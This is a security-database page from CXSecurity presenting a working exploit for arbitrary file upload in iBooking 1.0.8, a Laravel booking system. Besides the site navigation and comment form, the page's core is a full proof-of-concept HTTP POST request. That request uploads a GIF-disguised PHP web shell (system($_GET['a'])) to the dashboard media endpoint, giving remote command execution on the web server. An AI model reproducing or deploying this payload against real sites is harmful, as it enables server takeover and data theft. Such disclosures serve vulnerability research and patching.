---
title: iBooking 1.0.8 Remote Shell Upload
url: https://cxsecurity.com/issue/WLB-2023030065
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2023-03-31
fetch_date: 2025-10-04T11:10:50.938424
---

# iBooking 1.0.8 Remote Shell Upload

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **iBooking 1.0.8 Remote Shell Upload** **2023.03.30**  Credit:  **[d1z1n370](https://cxsecurity.com/author/d1z1n370/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **[CWE-264](https://cxsecurity.com/cwe/CWE-264 "Click to see CWE-264")** | |

# Exploit Title: iBooking v1.0.8 - Arbitrary File Upload
# Exploit Author: d1z1n370/oPty
# Date: 01/11/2022
# Vendor Homepage: https://codecanyon.net/item/ibooking-laravel-booking-system/30362088
# Tested on: Linux
# Version: 1.0.8
# Exploit Description:
The application is prone to an arbitrary file-upload because it fails to adequately sanitize user-supplied input. An attacker can exploit these issues to upload arbitrary files in the context of the web server process and execute commands.
# PoC request
POST https://localhost/dashboard/upload-new-media HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (X11; Linux x86\_64; rv:68.0) Gecko/20100101 Firefox/108.0
Accept: \*/\*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://localhost/dashboard/settings
X-Requested-With: XMLHttpRequest
Content-Type: multipart/form-data; boundary=---------------------------115904534120015298741783774062
Content-Length: 449
Connection: close
Cookie: PHPSESSID=a36f66fa4a5751d4a15db458d573139c
-----------------------------115904534120015298741783774062
Content-Disposition: form-data; name="\_token"
kVTpp66poSLeJVYgb1sM6F7KIzQV2hbVfQLaUEEW
-----------------------------115904534120015298741783774062
Content-Disposition: form-data; name="is\_modal"
1
-----------------------------115904534120015298741783774062
Content-Disposition: form-data; name="file"; filename="upload.php56"
Content-Type: image/gif
GIF89a;
<?php system($\_GET['a']); phpinfo(); ?>
-----------------------------115904534120015298741783774062--

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2023030065)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top